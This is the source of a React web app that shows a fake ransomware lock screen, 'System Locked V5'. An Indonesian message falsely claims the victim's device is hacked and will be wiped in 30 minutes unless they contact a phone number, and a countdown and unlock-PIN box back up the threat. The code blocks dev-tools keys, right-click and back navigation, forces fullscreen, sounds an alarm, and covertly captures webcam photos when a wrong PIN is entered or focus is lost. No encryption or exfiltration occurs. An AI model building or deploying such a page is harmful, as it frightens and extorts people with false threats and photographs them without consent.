/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect, useRef } from 'react';
import { ShieldAlert, Lock, AlertTriangle } from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';

const TARGET_PIN = "192827";

export default function App() {
  const [isLocked, setIsLocked] = useState<boolean>(true);
  const [inputPin, setInputPin] = useState<string>("");
  const [error, setError] = useState<string | null>(null);
  const [timeLeft, setTimeLeft] = useState(1800); // 30 minutes in seconds
  const [isAlarmActive, setIsAlarmActive] = useState(false);
  const [capturedImage, setCapturedImage] = useState<string | null>(null);
  const [isFullscreen, setIsFullscreen] = useState(false);
  const [isFocusLost, setIsFocusLost] = useState(false);
  const [toast, setToast] = useState<{ message: string; visible: boolean }>({ message: "", visible: false });

  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const audioContextRef = useRef<AudioContext | null>(null);
  const oscillatorRef = useRef<OscillatorNode | null>(null);

  // Toast Logic
  const showToast = (message: string) => {
    setToast({ message, visible: true });
    setTimeout(() => setToast(prev => ({ ...prev, visible: false })), 3000);
  };

  // Focus Protection Logic
  useEffect(() => {
    const handleFocus = () => setIsFocusLost(false);
    const handleBlur = () => {
      if (isLocked) {
        setIsFocusLost(true);
        captureSelfie();
      }
    };
    
    window.addEventListener('focus', handleFocus);
    window.addEventListener('blur', handleBlur);
    
    const handleVisibilityChange = () => {
      if (document.hidden && isLocked) {
        setIsFocusLost(true);
        captureSelfie();
      }
    };
    document.addEventListener('visibilitychange', handleVisibilityChange);

    const handleContextMenu = (e: MouseEvent) => {
      if (isLocked) e.preventDefault();
    };
    window.addEventListener('contextmenu', handleContextMenu);

    const handleKeyDown = (e: KeyboardEvent) => {
      if (!isLocked) return;
      
      // Block F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, etc.
      if (
        e.key === 'F12' || 
        ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
        ((e.ctrlKey || e.metaKey) && e.key === 'U') ||
        ((e.ctrlKey || e.metaKey) && e.key === 's')
      ) {
        e.preventDefault();
        showToast("SYSTEM_ACCESS_RESTRICTED");
      }
    };
    window.addEventListener('keydown', handleKeyDown);
    
    return () => {
      window.removeEventListener('focus', handleFocus);
      window.removeEventListener('blur', handleBlur);
      document.removeEventListener('visibilitychange', handleVisibilityChange);
      window.removeEventListener('contextmenu', handleContextMenu);
      window.removeEventListener('keydown', handleKeyDown);
    };
  }, [isLocked]);

  // Block back button
  useEffect(() => {
    const handlePopState = () => {
      if (isLocked) {
        window.history.pushState(null, "", window.location.href);
      }
    };
    window.history.pushState(null, "", window.location.href);
    window.addEventListener('popstate', handlePopState);
    return () => window.removeEventListener('popstate', handlePopState);
  }, [isLocked]);

  // Timer Logic
  useEffect(() => {
    if (!isLocked) return;
    const timer = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, [isLocked]);

  const formatTime = (seconds: number) => {
    const h = Math.floor(seconds / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = seconds % 60;
    return `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
  };

  // Alarm Logic
  const toggleAlarm = (active: boolean) => {
    setIsAlarmActive(active);
    if (active) {
      if (!audioContextRef.current) {
        audioContextRef.current = new (window.AudioContext || (window as any).webkitAudioContext)();
      }
      const ctx = audioContextRef.current;
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.type = 'sawtooth';
      osc.frequency.setValueAtTime(440, ctx.currentTime);
      osc.frequency.exponentialRampToValueAtTime(880, ctx.currentTime + 0.5);
      osc.loop = true;
      gain.gain.setValueAtTime(0.05, ctx.currentTime);
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start();
      oscillatorRef.current = osc;
    } else {
      oscillatorRef.current?.stop();
      oscillatorRef.current = null;
    }
  };

  // Intruder Selfie
  const captureSelfie = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play();
        setTimeout(() => {
          if (canvasRef.current && videoRef.current) {
            const context = canvasRef.current.getContext('2d');
            canvasRef.current.width = videoRef.current.videoWidth;
            canvasRef.current.height = videoRef.current.videoHeight;
            context?.drawImage(videoRef.current, 0, 0);
            const dataUrl = canvasRef.current.toDataURL('image/png');
            setCapturedImage(dataUrl);
            localStorage.setItem('intruder_selfie', dataUrl);
            stream.getTracks().forEach(track => track.stop());
          }
        }, 1000);
      }
    } catch (err) {
      console.error("Camera access denied", err);
    }
  };

  const handleUnlock = () => {
    if (inputPin === TARGET_PIN) {
      setIsLocked(false);
      setInputPin("");
      toggleAlarm(false);
    } else {
      setError("WRONG KEY");
      captureSelfie();
      toggleAlarm(true);
      setTimeout(() => setError(null), 2000);
    }
  };

  const enterFullscreen = () => {
    const elem = document.documentElement;
    if (elem.requestFullscreen) {
      elem.requestFullscreen().catch(() => {});
    }
    setIsFullscreen(true);
  };

  return (
    <div 
      className="min-h-screen bg-black text-white font-mono flex flex-col items-center justify-center p-6 relative overflow-hidden select-none"
      onClick={() => {
        if (!isFullscreen) enterFullscreen();
      }}
    >
      {/* Network Background Pattern */}
      <div className="absolute inset-0 opacity-20 pointer-events-none">
        <svg width="100%" height="100%" xmlns="http://www.w3.org/2000/svg">
          <defs>
            <pattern id="grid" width="100" height="100" patternUnits="userSpaceOnUse">
              <circle cx="2" cy="2" r="1.5" fill="white" />
              <line x1="2" y1="2" x2="100" y2="100" stroke="white" strokeWidth="0.5" />
              <line x1="2" y1="2" x2="0" y2="100" stroke="white" strokeWidth="0.5" />
              <line x1="100" y1="0" x2="0" y2="100" stroke="white" strokeWidth="0.5" />
            </pattern>
          </defs>
          <rect width="100%" height="100%" fill="url(#grid)" />
        </svg>
      </div>

      <video ref={videoRef} className="hidden" />
      <canvas ref={canvasRef} className="hidden" />

      <AnimatePresence mode="wait">
        {isLocked ? (
          <motion.div
            key="lock-screen"
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            className="z-10 w-full max-w-md flex flex-col items-center space-y-6"
          >
            {/* Header */}
            <div className="border-2 border-orange-500 rounded-2xl px-8 py-3 flex items-center space-x-3 bg-black/80">
              <AlertTriangle className="w-8 h-8 text-yellow-500 fill-yellow-500" />
              <h1 className="text-2xl font-bold text-green-500 tracking-tight">System Locked V5</h1>
            </div>

            {/* Message Box */}
            <div className="border border-green-500 rounded-2xl p-6 bg-black/90 w-full">
              <p className="text-sm leading-relaxed text-gray-200 text-center">
                perangkat anda telah kami retas, data anda akan segera saya hapus dalam 30 menit jika ingin di normalkan hubungi saya ke nomer ini : 083869335367.
              </p>
              <div className="w-4 h-1 bg-green-500 mt-4 mx-auto opacity-50" />
            </div>

            {/* Timer and Input Row */}
            <div className="flex w-full space-x-4">
              <div className="flex-1 border-2 border-red-600 rounded-xl py-3 flex items-center justify-center bg-black/80">
                <span className="text-red-600 font-bold text-xl">{formatTime(timeLeft)}</span>
              </div>
              <div className="flex-[1.5] border-2 border-red-600 rounded-xl px-4 py-3 bg-black/80">
                <input 
                  type="text"
                  value={inputPin}
                  onChange={(e) => setInputPin(e.target.value)}
                  placeholder="Masukkan key.."
                  className="w-full bg-transparent border-none outline-none text-gray-400 placeholder-gray-600 text-center font-bold"
                  onKeyDown={(e) => e.key === 'Enter' && handleUnlock()}
                />
              </div>
            </div>

            {/* Unlock Button */}
            <button 
              onClick={handleUnlock}
              className="w-full bg-green-500 hover:bg-green-400 text-black font-black py-4 rounded-full text-xl transition-all active:scale-95 shadow-[0_0_20px_rgba(34,197,94,0.4)]"
            >
              UNLOCK DEVICE
            </button>

            {/* Footer */}
            <p className="text-purple-600 font-bold text-sm pt-4">Tester by @afifahxrat</p>
          </motion.div>
        ) : (
          <motion.div
            key="unlocked"
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="z-10 w-full max-w-2xl bg-[#111] border border-green-500/30 rounded-3xl p-8 flex flex-col items-center space-y-6"
          >
            <ShieldAlert className="w-20 h-20 text-green-500" />
            <h2 className="text-2xl font-bold">SYSTEM RESTORED</h2>
            <p className="text-gray-400 text-center">Security integrity has been re-established. All data is safe.</p>
            
            <div className="w-full grid grid-cols-1 md:grid-cols-2 gap-4 pt-4">
              <div className="bg-black/40 border border-green-500/20 rounded-2xl p-4 space-y-3">
                <h3 className="text-[10px] font-bold text-green-500 uppercase tracking-widest">Kiosk Integrity Status</h3>
                <div className="space-y-1">
                  {[
                    "Lock Task Mode: ACTIVE",
                    "Home/Recent: BLOCKED",
                    "Status Bar: HIDDEN",
                    "Notification: BLOCKED",
                    "Screenshot: PROTECTED",
                    "Safe Mode: DISABLED",
                    "Factory Reset: DISABLED",
                    "USB Transfer: BLOCKED",
                    "Auto Start: ENABLED",
                    "Auto Relaunch: ACTIVE"
                  ].map((item, idx) => (
                    <div key={idx} className="flex items-center space-x-2 text-[9px] text-green-400">
                      <div className="w-1 h-1 rounded-full bg-green-500 animate-pulse" />
                      <span>{item}</span>
                    </div>
                  ))}
                </div>
              </div>

              <div className="bg-black/40 border border-red-500/20 rounded-2xl p-4 space-y-3">
                <h3 className="text-[10px] font-bold text-red-500 uppercase tracking-widest">Security Logs</h3>
                <div className="space-y-2">
                  {capturedImage ? (
                    <div className="space-y-2">
                      <p className="text-[9px] text-red-400">INTRUDER_DETECTED: Photo Captured</p>
                      <img src={capturedImage} alt="Intruder" className="w-full rounded-lg border border-red-500/50 grayscale" />
                    </div>
                  ) : (
                    <p className="text-[9px] text-gray-500 italic">No unauthorized access attempts logged.</p>
                  )}
                </div>
              </div>
            </div>

            <button 
              onClick={() => setIsLocked(true)}
              className="mt-8 px-8 py-3 border border-red-500 text-red-500 rounded-xl hover:bg-red-500/10 transition-colors"
            >
              RE-LOCK SYSTEM
            </button>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Focus Lost Protection Overlay */}
      <AnimatePresence>
        {isFocusLost && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-[200] bg-black flex flex-col items-center justify-center space-y-4"
          >
            <ShieldAlert className="w-16 h-16 text-[#ff0000] animate-pulse" />
            <h2 className="text-xl font-black text-[#ff0000] tracking-tighter">SCREENSHOT PROTECTION ACTIVE</h2>
            <p className="text-[10px] text-[#8e9299] uppercase">Window Focus Lost - System Scrambled</p>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Toast Notification */}
      <AnimatePresence>
        {toast.visible && (
          <motion.div
            initial={{ opacity: 0, y: 50, x: "-50%" }}
            animate={{ opacity: 1, y: 0, x: "-50%" }}
            exit={{ opacity: 0, y: 20, x: "-50%" }}
            className="fixed bottom-8 left-1/2 z-[300] bg-[#ff0000] text-white px-6 py-3 rounded-full shadow-[0_0_20px_rgba(255,0,0,0.5)] flex items-center space-x-3 border border-white/20"
          >
            <ShieldAlert className="w-5 h-5" />
            <span className="text-xs font-black tracking-widest uppercase">{toast.message}</span>
          </motion.div>
        )}
      </AnimatePresence>

      <style dangerouslySetInnerHTML={{ __html: `
        @keyframes pulse-red {
          0% { background-color: #000; }
          50% { background-color: #200; }
          100% { background-color: #000; }
        }
        .animate-pulse-red {
          animation: pulse-red 0.5s infinite;
        }
      `}} />
    </div>
  );
}
